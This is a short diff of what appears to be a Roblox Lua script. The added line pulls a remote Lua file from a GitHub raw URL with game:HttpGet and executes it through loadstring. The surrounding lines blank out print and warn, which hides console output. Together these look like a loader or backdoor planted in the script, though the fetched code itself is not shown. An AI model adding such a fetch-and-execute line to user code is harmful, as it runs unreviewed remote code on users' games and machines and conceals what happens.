@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YunLua/Lua/refs/heads/main/KFC.lua", true))()
+
 do
     print = function() end
     warn  = function() end
